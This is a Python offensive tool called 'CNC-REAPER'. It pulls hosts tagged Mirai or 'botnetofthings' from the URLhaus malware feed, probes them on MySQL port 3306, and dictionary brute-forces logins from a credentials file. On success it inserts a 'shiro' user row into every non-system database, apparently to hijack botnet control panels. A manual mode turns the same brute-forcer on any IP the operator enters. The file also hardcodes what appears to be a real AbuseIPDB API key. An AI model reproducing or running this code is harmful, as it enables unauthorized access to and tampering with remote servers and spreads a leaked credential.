import os, requests
import pymysql
import socket
import threading
from colorama import Style

class COLORS:
    white = "\033[00m"
    red = "\033[1;91m"
    yellow = "\033[38;2;255;202;0m"
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    DARKCYAN = '\033[36m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'


def logger(text):
    print(f"\n    {Style.DIM}{COLORS.red}CNC-REAPER {COLORS.white}-> "+text)


def banner():
    banner = Style.BRIGHT + """
                                        \033[38;2;255;202;0m╔═╗╔╗╔╔═╗  ╦═╗╔═╗╔═╗╔═╗╔═╗╦═╗
                                        ║  ║║║║    ╠╦╝║╣ ╠═╣╠═╝║╣ ╠╦╝
                                        ╚═╝╝╚╝╚═╝  ╩╚═╚═╝╩ ╩╩  ╚═╝╩╚═
                                                     \033[1;91mシロスクレイプ\033[00m
    
    """
    return banner

def clear():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')
    print(banner())
    
    
def CheckMysql(ip):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(1)
    try:
        so = s.connect_ex((ip,3306))
        if so == 0:
            return True
        s.close()
    except:
        return False


#curl -G https://api.abuseipdb.com/api/v2/blacklist \ -d limit=9999999 \ -H "

def scraper():
    all = "https://urlhaus.abuse.ch/downloads/csv/"
    recent = "https://urlhaus.abuse.ch/downloads/csv_recent/"
    online = "https://urlhaus.abuse.ch/downloads/csv_online/"
    
    LIST = ["recent", "online"]
    logger(f"Would u like to scrape [ {Style.DIM}{COLORS.yellow}{LIST[0]}, {LIST[1]} {COLORS.white}] ? ")
    USER_CHOICE = input(f"\n    {Style.DIM}{COLORS.red}OPTION {COLORS.white}-> ")
    
    if USER_CHOICE not in LIST:
        clear()
        scraper()
    
    if USER_CHOICE in LIST:
        mal = []
        ips = []
        OUR_LIST = requests.get(eval(USER_CHOICE))
        clear()
        for list in OUR_LIST.text.split('\n'):
            OBJ = ["botnetofthings", "mirai"]
            for lines in OBJ:
                if lines in list.lower():
                    ip = list.split(",")[2].split("://")[1].split("/")[0]
                    malware = list.split(",")[2].split("/")[3].split("/")[0]
                    malware = malware.replace('"', "")
                    
                    if ip in ips:
                        continue
                    
                    if len(malware) > 10:
                        malware = malware[:10] 
                    if not CheckMysql(ip):
                        continue
                    
                    ips.append(ip)
                    
                    logger(Style.DIM + COLORS.white+f"CNC: {Style.BRIGHT}{ip} | Malware:  {malware} | Type:  {Style.BRIGHT}{lines}")
                    #mal.append(malware)
                    
                    t2 = threading.Thread(target=brute, args=([ip]))
                    t2.start()
                    t2.join()

                

def bruter():
    ip = input(f"    {Style.DIM}{COLORS.red}IP {COLORS.white}-> ")
    
    if '3306' in ip:
        clear()
        bruter()
        
    t1 = threading.Thread(target=brute, args=([ip]))
    t1.start()
    t1.join()


def test():
    abuseip = "https://api.abuseipdb.com/api/v2/blacklist" 
    headers = {"Accept": "text/plain", "Key": "39b9baa076e8fda6101ffa3f1219c5e357cb0c06b51120398218174aca56cead4702a5ff032672b5"}
    data = {
        "limit": "300"
    }
    
    ips = requests.get(abuseip, headers=headers, data=data)
    print(ips.text)

def brute(ip):
    filterdb = ["information_schema","performance_schema","mysql","Z_README_TO_RECOVER"]
    FILE = open("creds.txt", 'r+').readlines()
    logger(COLORS.white + f"{Style.DIM}Starting to bruteforce {ip}:3306...")
    for lines in FILE:
        lines = lines.strip('\n')
        
        username = lines.split(':')[0]
        password = lines.split(':')[1]
        
        try:
            conn = pymysql.connect(host=ip,user=username,password=password,charset='utf8mb4',cursorclass=pymysql.cursors.DictCursor,read_timeout=4,write_timeout=3,connect_timeout=3)
            logger(Style.BRIGHT+f"Bruted MySQL server [{Style.BRIGHT}{COLORS.white}{ip}:3306] ({COLORS.yellow}{username}:{password}{COLORS.white})")
            cursor = conn.cursor()
            cursor.execute('show databases')
            for a_dict in cursor.fetchall():
                for db in a_dict:
                    if a_dict[db] not in filterdb:
                        try:
                            cursor.execute(f'use {a_dict[db]};')
                            cursor.execute(f"INSERT INTO users VALUES (NULL, 'shiro', 'shiro', 0, 0, 0, 0, -1, 1, 30, '');")
                        except Exception as e:
                            print(e)
        except:
            
            #print(username, password)
            #if pymysql.err.OperationalError:
                #logger(Style.DIM + COLORS.DARKCYAN + f"Could not connect to MySQL server [{COLORS.red}{ip}:3306{COLORS.DARKCYAN}]")
                #break
            pass

def helpmenu():
    help = f"""                   
                             {COLORS.white}══════════════════════════════════════════════════════
                            {COLORS.white}║ \033[00mAutoscan       |{Style.DIM}{COLORS.red} Auto scrapes cncs\033[91m       {COLORS.white}            ║
                            {COLORS.white}║ \033[00mBrute <HOST>   |{Style.DIM}{COLORS.red} dictionary brute-force against host\033[91m {COLORS.white}║
                             {COLORS.white}══════════════════════════════════════════════════════\033[00m
          
          
          """
    return help
    




def main():
    USER_CHOICE = input(f"    {Style.DIM}{COLORS.red}REAPER {COLORS.white}-> ")
    
    COMMAND_LIST = ["help",
                    "autoscan",
                    "brute",
                    "clear"]
    
    if USER_CHOICE == COMMAND_LIST[0]:
        print(helpmenu())
    elif USER_CHOICE == COMMAND_LIST[1]:
        clear()
        #logger(Style.DIM + COLORS.DARKCYAN + "Starting to scrape from urlabuse apis..." + COLORS.white)
        scraper()
    elif USER_CHOICE == COMMAND_LIST[2]:
        bruter()
        
    elif USER_CHOICE == COMMAND_LIST[3]:
        clear()

    if USER_CHOICE not in COMMAND_LIST:
        main()
    main()
if __name__ == '__main__':
    clear()
    main()